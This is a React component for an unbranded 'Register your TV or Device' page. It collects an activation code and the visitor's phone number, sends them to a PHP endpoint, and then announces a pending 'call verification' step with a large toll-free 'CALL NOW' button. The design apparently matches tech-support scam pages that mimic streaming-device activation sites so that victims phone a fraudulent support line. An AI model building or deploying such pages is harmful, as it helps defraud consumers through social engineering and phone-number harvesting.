import React, { useState } from "react";
import API_BASE_URL from "../services/api";

const CALL_NUMBER = "+18558112105";

const DeviceActivation: React.FC = () => {
  const [step, setStep] = useState<1 | 2>(1);
  const [code, setCode] = useState("");
  const [phone, setPhone] = useState("");
  const [loading, setLoading] = useState(false);

  const handleActivate = async () => {
  if (!code || !phone) {
    alert("Please enter code and phone number");
    return;
  }

  setLoading(true);

  try {
    const res = await fetch(`${API_BASE_URL}/device_activate.php`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code, phone }),
    });

    const text = await res.text();

    let data;
    try {
      data = text ? JSON.parse(text) : {};
    } catch {
      throw new Error("Server returned invalid JSON:\n" + text);
    }

    if (!res.ok || data.status !== "ok") {
      throw new Error(data.message || "Activation failed");
    }

    setStep(2); // ✅ success
  } catch (err: any) {
    alert(err.message);
  } finally {
    setLoading(false);
  }
};


  return (
    <div className="min-h-screen flex items-center justify-center bg-black px-4">
      {step === 1 ? (
        <div className="w-full max-w-xl bg-[#0f172a] rounded-2xl shadow-2xl p-8 border border-blue-500/20">
          <h1 className="text-3xl font-bold text-blue-400 text-center mb-2">
            Register your TV or Device
          </h1>

          <p className="text-center text-gray-400 mb-8">
            Enter the code shown on your TV or device
          </p>

          <div className="space-y-4">
            <input
              type="text"
              placeholder="Enter Your Code Here"
              value={code}
              onChange={(e) => setCode(e.target.value)}
              className="w-full px-4 py-3 rounded-lg bg-black border border-gray-700 text-white focus:border-blue-500 outline-none"
            />

            <input
              type="tel"
              placeholder="Enter Your Phone Number"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              className="w-full px-4 py-3 rounded-lg bg-black border border-gray-700 text-white focus:border-blue-500 outline-none"
            />
          </div>

          <button
            onClick={handleActivate}
            disabled={loading}
            className={`w-full mt-6 bg-blue-600 hover:bg-blue-700 transition text-white font-semibold py-3 rounded-lg ${
              loading ? "opacity-60 cursor-not-allowed" : ""
            }`}
          >
            {loading ? "Processing..." : "ACTIVATE NOW"}
          </button>

          <p className="text-center text-gray-400 mt-6">
            Need help?{" "}
            <a href={`tel:${CALL_NUMBER}`} className="text-blue-400 hover:underline">
              Call +1-855-811-2105
            </a>
          </p>
        </div>
      ) : (
        /* STEP 2 */
        <div className="w-full max-w-3xl text-center bg-[#0b1220] rounded-2xl shadow-2xl p-10 border border-blue-500/20">
          <h2 className="text-4xl font-bold text-blue-400 mb-3">Success!</h2>

          <p className="text-lg text-gray-300 mb-6">
            ( Your code has been redeemed )
          </p>

          <h3 className="text-2xl font-semibold text-yellow-400 mb-2">
            Step - 2 Pending
          </h3>

          <p className="text-gray-300 mb-8">( Call verification required )</p>

          <a
            href={`tel:${CALL_NUMBER}`}
            className="inline-block bg-blue-600 hover:bg-blue-700 text-white font-semibold px-10 py-3 rounded-lg"
          >
            CALL NOW: +1-855-811-2105
          </a>
        </div>
      )}
    </div>
  );
};

export default DeviceActivation;
